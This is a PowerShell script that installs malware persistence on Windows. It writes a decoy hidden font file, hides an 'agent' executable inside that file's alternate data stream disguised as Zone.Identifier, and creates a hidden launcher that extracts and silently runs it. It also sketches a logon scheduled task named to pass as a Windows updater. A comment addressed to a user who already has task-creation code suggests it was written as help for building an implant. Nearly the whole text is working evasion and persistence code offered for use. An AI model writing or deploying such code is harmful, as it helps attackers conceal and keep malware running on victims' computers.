param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# --- 1. Create fake font file in Fonts folder ---
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
}
$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    $fakeFontContent = "TTF fake font file – do not delete"
    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
    attrib +h $fontFile
}

# --- 2. Hide agent in ADS ---
$streamName = "Zone.Identifier"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$fontFile`:$streamName"

# --- 3. Create launcher script in the same folder ---
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw
[System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
Start-Process -WindowStyle Hidden `$tempAgent
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

# --- 4. Create scheduled task pointing to the permanent script ---
$taskName = "WindowsUpdaterTask"
$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
# ... (use COM or schtasks to create/update the task)
# (I'll include the COM part for completeness, but you can keep your existing task creation code)

# For example, using schtasks (if allowed):
# schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it

Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Script location: $launcherPath"
Write-Output "Agent hidden in: $hiddenPath"
Write-Output "The scheduled task will run the script from the permanent folder on next logon."